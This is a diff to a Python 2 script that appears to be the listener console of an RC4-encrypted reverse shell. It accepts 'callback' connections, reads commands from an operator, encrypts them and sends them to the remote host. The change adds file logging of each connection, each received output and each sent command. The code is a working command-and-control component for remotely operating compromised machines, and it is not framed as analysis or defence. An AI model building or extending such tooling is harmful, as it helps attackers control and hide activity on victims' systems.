@@ -4,9 +4,13 @@ import sys
 import socket
 import time
 
-version = "1.0"
+version = "1.1"
 buffer_size = 4096
 recv_timeout = 0.2
+logpath = time.strftime("%c") + ".log" 
+
+def log_command(command, action, path):
+	open(path, "a+").write("\n[%s] %s:\n--------------------------------------------\n%s" % (time.strftime("%c"), action, command))
 
 def KSA(key):
     keylength = len(key)
@@ -19,7 +23,6 @@ def KSA(key):
         S[i], S[j] = S[j], S[i]
 
     return S
-
 
 def PRGA(S):
     i = 0
@@ -72,6 +75,7 @@ if __name__ == "__main__":
 		while True:
 			conn, addr = s.accept()
 			print "[+] Callback from %s:%d" % (addr[0], addr[1])
+			log_command("Callback from %s:%d" % (addr[0], addr[1]), "New Connection", logpath)
 			
 			data = True
 			while data:
@@ -81,9 +85,13 @@ if __name__ == "__main__":
 					time.sleep(recv_timeout)
 					data = recvall(conn, int(data[11:]))
 					data = RC4(data, key)
+				
+				log_command(data, "Received", logpath)
 				cmd = raw_input(data)
 				if cmd == "":
 					cmd = ";"
+				
+				log_command(cmd, "Sending", logpath)
 				cmd = RC4(cmd, key)
 				conn.send(cmd)
 	except KeyboardInterrupt:
